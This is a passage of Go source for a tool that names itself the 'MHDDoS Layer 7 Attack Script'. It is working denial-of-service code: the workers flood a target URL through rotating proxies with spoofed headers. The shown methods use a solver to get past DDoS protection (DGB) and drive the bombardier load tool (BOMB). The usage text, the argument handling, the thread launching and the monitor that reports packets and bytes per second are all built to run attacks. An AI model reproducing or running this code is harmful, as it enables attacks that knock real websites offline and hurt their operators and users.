	dgbClient, dgbJar := dgbSolver(h.target, ua, proxyURL, h.cookie, h.threadID)

	if dgbClient == nil || dgbJar == nil {
		logDebugf("[Thread %d] DGB solver failed for %s. Stopping DGB execution.", h.threadID, h.target.String())
		// Avoid busy-looping if solver consistently fails
		time.Sleep(time.Second)
		return
	}

	count := h.rpc
	if count > 5 {
		count = 5
	}
	logDebugf("[Thread %d] DGB: Solver successful (maybe), proceeding with %d requests.", h.threadID, count)

	targetURL := h.target.String()

	for i := 0; i < count; i++ {
		select {
		case <-h.ctx.Done():
			logDebugf("[Thread %d] DGB: Context cancelled loop %d.", h.threadID, i)
			return
		default:
			sleepDuration := time.Duration(float64(count)/100.0*1000.0) * time.Millisecond
			logDebugf("[Thread %d] DGB: Sleeping %v before request %d", h.threadID, sleepDuration, i+1)
			time.Sleep(sleepDuration)

			reqCtx, reqCancel := context.WithTimeout(h.ctx, dgbClient.Timeout)
			req, err := http.NewRequestWithContext(reqCtx, "GET", targetURL, nil)
			if err != nil {
				logDebugf("[Thread %d] DGB: Failed to create request %d: %v", h.threadID, i+1, err)
				reqCancel()
				continue
			}

			// Set basic headers, relying on cookies from the jar.
			// The solver should have added the initial cookie if provided.
			req.Header.Set("User-Agent", ua)
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
			req.Header.Set("Connection", "keep-alive")


			logDebugf("[Thread %d] DGB: Sending request %d to %s", h.threadID, i+1, targetURL)
			resp, err := dgbClient.Do(req) // Use the client returned by the solver
			if err != nil {
				logDebugf("[Thread %d] DGB: Request %d failed (%s%s): %v", h.threadID, i+1, targetURL, func() string { if proxyURL != nil { return " via " + proxyURL.Host } else { return "" } }(), err)
				reqCancel()
				// Stop requests for this session on error
				return
			}

			reqSize := sizeOfRequest(req)
			nBytes, copyErr := io.Copy(io.Discard, resp.Body)
			closeErr := resp.Body.Close()
			reqCancel()

			if copyErr != nil {
				logDebugf("[Thread %d] DGB: Error discarding response body for request %d: %v", h.threadID, i+1, copyErr)
			}
			if closeErr != nil {
				logDebugf("[Thread %d] DGB: Error closing response body for request %d: %v", h.threadID, i+1, closeErr)
			}


			REQUESTS_SENT_COUNTER.Add(1)
			BYTES_SENT_COUNTER.Add(reqSize)

			logDebugf("[Thread %d] DGB: Request %d to %s status: %s (Read %d body bytes)", h.threadID, i+1, targetURL, resp.Status, nBytes)
		}
	}
	logDebugf("[Thread %d] DGB: Finished loop.", h.threadID)
}

// --- External Tool Method ---

func (h *HttpFlood) BOMB() {
	logDebugf("[Thread %d] Executing BOMB method", h.threadID)
	if len(h.proxies) == 0 {
		logDebugf("[Thread %d] BOMB: Method requires proxies, but none loaded. Skipping.", h.threadID)
		time.Sleep(1 * time.Second)
		return
	}
	if h.bombardierPath == "" {
		logDebugf("[Thread %d] BOMB: Bombardier path not found or configured. Skipping.", h.threadID)
		time.Sleep(1 * time.Second)
		return
	}

	proxy := h.proxies[mrand.Intn(len(h.proxies))]
	proxyFormatted := proxy.lformatted()
	logDebugf("[Thread %d] BOMB: Using proxy %s", h.threadID, proxyFormatted)

	requestsPerConn := h.rpc * 10
	if requestsPerConn < h.rpc {
		requestsPerConn = h.rpc
	}
	if requestsPerConn < 1 {
		requestsPerConn = 1
	}

	args := []string{
		"-c", strconv.Itoa(h.rpc),
		//"--http2", // Optional: Enable HTTP/2 if needed for parity
		"-m", h.reqType,
		"--timeout=30s",
		"-n", strconv.Itoa(requestsPerConn),
		"--proxy", proxyFormatted,
	}
	if h.target.Scheme == "https" {
		args = append(args, "--insecure")
	}

	// Add Headers
	args = append(args, "-H", fmt.Sprintf("User-Agent: %s", randChoice(h.useragents)))
	ref := randChoice(h.referers)
	refererURL := ref + url.QueryEscape(h.target.String())
	args = append(args, "-H", fmt.Sprintf("Referer: %s", refererURL))
	if h.cookie != "" {
		args = append(args, "-H", fmt.Sprintf("Cookie: %s", h.cookie))
	}
	args = append(args, "-H", "Accept: */*")
	args = append(args, "-H", "Accept-Encoding: gzip, deflate, br")
	args = append(args, "-H", "Accept-Language: en-US,en;q=0.5")

	args = append(args, h.target.String())

	cmdCtx, cmdCancel := context.WithTimeout(h.ctx, 45*time.Second)
	defer cmdCancel()

	cmd := exec.CommandContext(cmdCtx, h.bombardierPath, args...)

	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	logDebugf("[Thread %d] BOMB: Executing command: %s %s", h.threadID, h.bombardierPath, strings.Join(args, " "))

	startTime := time.Now()
	err := cmd.Run()
	duration := time.Since(startTime)

	stdoutStr := stdoutBuf.String()
	stderrStr := stderrBuf.String()
	if h.threadID == 0 && *debugFlag {
		logDebugf("[Thread 0] Bombardier Proxy: %s", proxyFormatted)
		logDebugf("[Thread 0] Bombardier Command: %s %s", cmd.Path, strings.Join(cmd.Args[1:], " "))
		logDebugf("[Thread 0] Bombardier Duration: %v", duration)
		if stdoutStr != "" {
			logDebugf("[Thread 0] Bombardier stdout:\n%s", stdoutStr)
		}
		if stderrStr != "" {
			logDebugf("[Thread 0] Bombardier stderr:\n%s", stderrStr)
		}
	}

	if err != nil {
		exitCode := -1
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		}
		if cmdCtx.Err() == context.DeadlineExceeded {
			logDebugf("[Thread %d] BOMB: Bombardier command timed out after %v.", h.threadID, duration)
		} else {
			logDebugf("[Thread %d] BOMB: Bombardier execution failed (code %d) after %v: %v. Stderr: %s", h.threadID, exitCode, duration, err, stderrStr)
		}
		time.Sleep(500 * time.Millisecond)
		return
	}

	logDebugf("[Thread %d] BOMB: Bombardier finished successfully in %v.", h.threadID, duration)
	REQUESTS_SENT_COUNTER.Add(uint64(requestsPerConn))
	// Byte counting is difficult, skip for BOMB.
}

// --- Main Execution ---

func printUsage() {
	fmt.Fprintf(os.Stderr, "\n* MHDDoS Layer 7 Attack Script (Version: %s) *\n", version)
	fmt.Fprintln(os.Stderr, "Usage:")
	fmt.Fprintf(os.Stderr, "  %s [options]\n\n", filepath.Base(os.Args[0]))
	fmt.Fprintln(os.Stderr, "Options:")
	flag.PrintDefaults() // Print flag descriptions automatically
	fmt.Fprintln(os.Stderr, "\nArguments (Legacy - use flags instead):")
	// Sort methods for display
	sortedMethods := make([]string, 0, len(LAYER7_METHODS))
	for m := range LAYER7_METHODS {
		sortedMethods = append(sortedMethods, m)
	}
	sort.Strings(sortedMethods)
	fmt.Fprintf(os.Stderr, "  <METHOD>        : Attack method (e.g., GET, POST, CFB, SLOW). Available: %s.\n", strings.Join(sortedMethods, ", "))
	fmt.Fprintln(os.Stderr, "  <URL>           : Target URL (e.g., http://example.com).")
	fmt.Fprintln(os.Stderr, "  <Threads>       : Number of concurrent attack threads.")
	fmt.Fprintln(os.Stderr, "  <ProxyListFile> : Path to the proxy list file (relative to script dir).")
	fmt.Fprintln(os.Stderr, "  <RPC>           : Requests Per Connection / Concurrency Factor.")
	fmt.Fprintln(os.Stderr, "  <Duration>      : Attack duration in seconds.")
	fmt.Fprintln(os.Stderr, "  [Cookie]        : [Optional] Cookie string.")
	fmt.Fprintln(os.Stderr, "  [DEBUG]         : [Optional] Add 'DEBUG' to enable debug logging.")

	fmt.Fprintln(os.Stderr, "\nExample (using flags):")
	fmt.Fprintf(os.Stderr, "  %s -method GET -url http://target.site -threads 100 -proxyfile files/proxies/socks5.txt -rpc 50 -duration 60\n", filepath.Base(os.Args[0]))
	fmt.Fprintf(os.Stderr, "  %s -method CFB -url https://target.site/login -threads 200 -proxyfile files/proxies/http.txt -rpc 75 -duration 120 -cookie 'session=abc123xyz'\n", filepath.Base(os.Args[0]))
	fmt.Fprintf(os.Stderr, "  %s -method POST -url http://api.target.site -threads 50 -proxyfile noproxies.txt -rpc 10 -duration 30 -debug\n", filepath.Base(os.Args[0]))
	fmt.Fprintf(os.Stderr, "  %s -method BOMB -url https://target.site -threads 50 -proxyfile files/proxies/socks5.txt -rpc 100 -duration 120 -bombardier /path/to/bombardier\n", filepath.Base(os.Args[0]))

	fmt.Fprintln(os.Stderr, "\nExample (using legacy arguments):")
	fmt.Fprintf(os.Stderr, "  %s GET http://target.site 100 files/proxies/socks5.txt 50 60\n", filepath.Base(os.Args[0]))
}

func main() {
	flag.Usage = printUsage // Set custom usage function
	flag.Parse()

	// --- Configure Logger based on Debug Flag ---
	if *debugFlag {
		logger.SetPrefix(fmt.Sprintf("[%s - DEBUG] ", time.Now().Format("15:04:05")))
		logDebugf("Debug mode enabled.")
	} else {
		logger.SetPrefix(fmt.Sprintf("[%s - INFO] ", time.Now().Format("15:04:05")))
	}

	// --- Argument Validation (using flags) ---
	method := ""
	urlRaw := ""
	threads := 0
	proxyFilePath := ""
	rpc := 0
	timer := 0
	cookie := ""

	// Check if flags were used or try legacy positional args
	if *methodFlag != "" && *urlFlag != "" {
		method = strings.ToUpper(*methodFlag)
		urlRaw = strings.TrimSpace(*urlFlag)
		threads = *threadsFlag
		proxyFilePath = strings.TrimSpace(*proxyFileFlag)
		rpc = *rpcFlag
		timer = *durationFlag
		cookie = *cookieFlag
		// Debug already handled by *debugFlag
	} else if len(os.Args) >= 7 {
		warning("Using legacy positional arguments. Consider switching to flags for clarity.")
		method = strings.ToUpper(os.Args[1])
		urlRaw = strings.TrimSpace(os.Args[2])
		threadsStr := os.Args[3]
		proxyFilePath = strings.TrimSpace(os.Args[4])
		rpcStr := os.Args[5]
		timerStr := os.Args[6]

		var err error
		threads, err = strconv.Atoi(threadsStr)
		if err != nil || threads <= 0 {
			fatal("Invalid number of threads (legacy arg 3).")
		}
		rpc, err = strconv.Atoi(rpcStr)
		if err != nil || rpc <= 0 {
			fatal("Invalid RPC value (legacy arg 5).")
		}
		timer, err = strconv.Atoi(timerStr)
		if err != nil || timer <= 0 {
			fatal("Invalid duration value (legacy arg 6).")
		}

		// Legacy optional Cookie and DEBUG
		currentArgIndex := 7
		if len(os.Args) > currentArgIndex {
			if strings.ToUpper(os.Args[currentArgIndex]) == "DEBUG" {
				if !*debugFlag { // Avoid double setting if flag was also used
					*debugFlag = true
					logger.SetPrefix(fmt.Sprintf("[%s - DEBUG] ", time.Now().Format("15:04:05")))
					logDebugf("Debug mode enabled via legacy argument.")
				}
				currentArgIndex++
			} else {
				cookie = os.Args[currentArgIndex]
				currentArgIndex++
				if len(os.Args) > currentArgIndex && strings.ToUpper(os.Args[currentArgIndex]) == "DEBUG" {
					if !*debugFlag {
						*debugFlag = true
						logger.SetPrefix(fmt.Sprintf("[%s - DEBUG] ", time.Now().Format("15:04:05")))
						logDebugf("Debug mode enabled via legacy argument.")
					}
				}
			}
		}
	} else {
		flag.Usage()
		os.Exit(1)
	}

	// Validate required arguments regardless of input method
	if method == "" {
		fatal("Attack method is required (-method flag).")
	}
	if urlRaw == "" {
		fatal("Target URL is required (-url flag).")
	}
	if threads <= 0 {
		fatal("Number of threads must be positive (-threads flag).")
	}
	if rpc <= 0 {
		fatal("RPC value must be positive (-rpc flag).")
	}
	if timer <= 0 {
		fatal("Duration value must be positive (-duration flag).")
	}

	if _, ok := LAYER7_METHODS[method]; !ok {
		fatal(fmt.Sprintf("Method '%s' not found. Available L7 methods: %s", method, func() string {
			sortedMethods := make([]string, 0, len(LAYER7_METHODS))
			for m := range LAYER7_METHODS {
				sortedMethods = append(sortedMethods, m)
			}
			sort.Strings(sortedMethods)
			return strings.Join(sortedMethods, ", ")
		}()))
	}

	if !strings.HasPrefix(urlRaw, "http://") && !strings.HasPrefix(urlRaw, "https://") {
		urlRaw = "http://" + urlRaw // Default to HTTP if no scheme
		logDebugf("URL scheme missing, defaulting to http: %s", urlRaw)
	}

	targetURL, err := url.Parse(urlRaw)
	if err != nil || targetURL.Host == "" {
		fatal(fmt.Sprintf("Invalid URL: '%s'. Error: %v", urlRaw, err))
	}
	logDebugf("Parsed Target URL: Scheme=%s, Host=%s, Path=%s, Query=%s", targetURL.Scheme, targetURL.Host, targetURL.Path, targetURL.RawQuery)

	// Resolve Hostname (used for direct/proxied socket connection, SNI)
	var hostIP string
	if method != "TOR" {
		logDebugf("Resolving hostname: %s", targetURL.Hostname())
		ips, err := net.LookupHost(targetURL.Hostname())
		if err != nil || len(ips) == 0 {
			fatal(fmt.Sprintf("Cannot resolve hostname: %s. Error: %v", targetURL.Hostname(), err))
		}
		hostIP = ips[0] // Use the first resolved IP
		logDebugf("Resolved %s to %s", targetURL.Hostname(), hostIP)
	} else {
		hostIP = targetURL.Hostname() // For TOR, HttpFlood uses the .onion address directly
		logDebugf("TOR method specified, using %s directly for connection logic.", hostIP)
	}

	// --- Load User Agents and Referers (Done in init now) ---
	logDebugf("Using %d user agents and %d referers loaded during init.", len(userAgents), len(referers))

	// --- Handle Proxies ---
	proxies := handleProxyList(proxyFilePath)

	// --- Bombardier Check (if method is BOMB) ---
	var bombardierPath string
	if method == "BOMB" {
		if *bombardierPathFlag != "" {
			// User specified path explicitly
			if _, errStat := os.Stat(*bombardierPathFlag); errStat != nil {
				fatal(fmt.Sprintf("Specified bombardier path not found: %s", *bombardierPathFlag))
			}
			bombardierPath = *bombardierPathFlag
			logDebugf("Using user-specified bombardier path: %s", bombardierPath)
		} else {
			// Try finding it automatically
			bombardierCmd := "bombardier"
			if runtime.GOOS == "windows" {
				bombardierCmd += ".exe" // Look for .exe on Windows
			}
			path, err := exec.LookPath(bombardierCmd)
			if err == nil {
				bombardierPath = path
				logDebugf("Found bombardier in PATH: %s", bombardierPath)
			} else {
				// Try Go bin path as fallback
				goPath := os.Getenv("GOPATH")
				if goPath == "" {
					homeDir, errHome := os.UserHomeDir()
					if errHome != nil {
                        warning("Could not determine user home directory to check default Go bin path.")
						goPath = "" // Cannot check default path
					} else {
                        goPath = filepath.Join(homeDir, "go") // Default Go path assumption
                    }
				}
                if goPath != "" {
                    altPath := filepath.Join(goPath, "bin", bombardierCmd)
                    if _, errStat := os.Stat(altPath); errStat == nil {
                        bombardierPath = altPath
                        logDebugf("Found bombardier in GOPATH/bin: %s", bombardierPath)
                    } else {
                        fatal(fmt.Sprintf("BOMB method requires 'bombardier' executable in PATH, ~/go/bin, or specified via -bombardier flag.\nInstall it: https://github.com/codesenberg/bombardier"))
                    }
                } else {
                    fatal(fmt.Sprintf("BOMB method requires 'bombardier' executable in PATH or specified via -bombardier flag (could not check default Go bin path).\nInstall it: https://github.com/codesenberg/bombardier"))
                }
			}
		}

		if len(proxies) == 0 {
			fatal("BOMB method requires a non-empty proxy list file.")
		}
	}

	// --- Start Attack ---
	mainCtx, cancel := context.WithCancel(context.Background())
	startTime = time.Now()

	// Setup signal handling for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	var wg sync.WaitGroup

	go func() {
		sig := <-sigChan // Wait for signal
		logDebugf("Received signal: %v. Initiating shutdown.", sig)
		warning("\nCtrl+C detected. Stopping attack...")
		signal.Stop(sigChan) // Stop listening for more signals
		cancel()             // Trigger cancellation via context
	}()

	info(fmt.Sprintf("Starting Attack to %s%s%s | Method: %s%s%s | Threads: %s%d%s | RPC: %s%d%s | Duration: %s%ds%s",
		colors.OKBLUE, targetURL.Host, colors.OKCYAN,
		colors.OKBLUE, method, colors.OKCYAN,
		colors.OKBLUE, threads, colors.OKCYAN,
		colors.OKBLUE, rpc, colors.OKCYAN,
		colors.OKBLUE, timer, colors.RESET,
	))
	if cookie != "" {
		logCookie := cookie
		if len(logCookie) > 30 {
			logCookie = logCookie[:30] + "..."
		}
		info(fmt.Sprintf("Using Cookie: '%s'", logCookie))
	}

	// Launch worker goroutines
	logDebugf("Launching %d worker goroutines...", threads)
	for i := 0; i < threads; i++ {
		wg.Add(1)
		// Pass resolved IP (hostIP) or original host (for TOR)
		flood := NewHttpFlood(i, targetURL, hostIP, method, rpc, mainCtx, &wg, userAgents, referers, proxies, cookie, bombardierPath)
		go flood.run()
	}
	logDebugf("All %d threads launched.", threads)

	// --- Monitoring Loop ---
	monitorTicker := time.NewTicker(1 * time.Second)
	defer monitorTicker.Stop()

	attackEndTime := startTime.Add(time.Duration(timer) * time.Second)
	monitoringActive := true

	for monitoringActive {
		select {
		case <-monitorTicker.C:
			now := time.Now()
			if now.After(attackEndTime) {
				info("Attack duration finished.")
				cancel() // Signal threads to stop based on timer
				monitoringActive = false // Exit loop after this tick
			}

			// Removed unused elapsedTime calculation
			remainingTime := time.Until(attackEndTime) // Use time.Until for cleaner remaining time
			if remainingTime < 0 {
				remainingTime = 0
			}

			// Get stats for the last second
			pps := REQUESTS_SENT_COUNTER.Reset()
			bps := BYTES_SENT_COUNTER.Reset()

			// Format output carefully for alignment
			ppsStr := humanFormat(pps, 2)
			bpsStr := humanBytes(bps, false, 2)
			targetHostStr := targetURL.Host
			if len(targetHostStr) > 25 {
				targetHostStr = targetHostStr[:22] + "..."
			}

			// [INFO] Ongoing > Target: target.host | Method: METHOD | PPS: 123.45k | BPS: 12.34 MB | Time Left: 50s
			logger.Printf("%sOngoing > Target:%s %-25s%s | Method:%s %-8s%s | PPS:%s %-7s%s | BPS:%s %-10s%s | Time Left:%s %ds %s",
				colors.OKCYAN, // Prefix color
				colors.OKBLUE, targetHostStr, colors.OKCYAN, // Target
				colors.OKBLUE, method, colors.OKCYAN, // Method
				colors.OKBLUE, ppsStr, colors.OKCYAN, // PPS
				colors.OKBLUE, bpsStr, colors.OKCYAN, // BPS
				colors.OKBLUE, int(remainingTime.Seconds()), colors.RESET, // Time Left
			)

		case <-mainCtx.Done(): // Detect cancellation from signal or timer expiry run
			logDebugf("Monitoring loop detected context cancellation.")
			monitoringActive = false // Exit the monitoring loop
		}
	}

	logDebugf("Monitoring loop finished. Waiting for threads to complete...")
	// Wait for all goroutines to finish with a timeout
	waitTimeout := 5 * time.Second
	waitChan := make(chan struct{})
	go func() {
		wg.Wait()
		close(waitChan)
	}()

	select {
	case <-waitChan:
		logDebugf("All worker goroutines finished gracefully.")
	case <-time.After(waitTimeout):
		logDebugf("Timeout (%v) waiting for worker goroutines to finish. Some may still be running.", waitTimeout)
	}

	finalElapsed := time.Since(startTime)
	info(fmt.Sprintf("Attack finished after %s.", finalElapsed.Round(time.Second)))
	os.Exit(0)
}

// Helper function min for Go < 1.21
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// String method for ProxyType enum for debugging
func (pt ProxyType) String() string {
	switch pt {
	case HTTP:
		return "HTTP"
	case SOCKS4:
		return "SOCKS4"
	case SOCKS5:
		return "SOCKS5"
	case Unknown:
		return "Unknown"
	default:
		return fmt.Sprintf("ProxyType(%d)", pt)
	}
}